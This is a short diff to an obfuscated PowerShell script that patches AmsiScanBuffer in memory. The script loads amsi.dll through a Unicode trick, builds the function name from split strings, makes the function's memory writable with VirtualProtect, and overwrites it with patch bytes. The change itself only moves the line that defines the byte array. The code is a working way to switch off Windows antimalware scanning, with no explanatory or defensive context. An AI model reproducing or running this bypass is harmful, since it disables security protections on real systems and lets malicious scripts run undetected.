@@ -17,7 +17,7 @@ $hh = @"
 Protect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-
+$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
 $afrcv = $ahh+$hh
 
 $test -TypeDefinition $afrcv
@@ -25,5 +25,5 @@ $wzqprfk = [afrcv]::LoadLibrary("$(('àmsî.'+'dll').NoRMAlize([chaR]([byte]0x46
 $npmjpz = [afrcv]::GetProcAddress($wzqprfk, "A"+"m"+"si" + "S"+"c"+"an" + "Bu"+"f"+"f"+"er")
 [afrcv]::VirtualProtect($npmjpz, [uint32]5, 0x40,[ref]$p)
 
-$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
+
 $7amada::Copy($acyyr, 0, $npmjpz, 6)
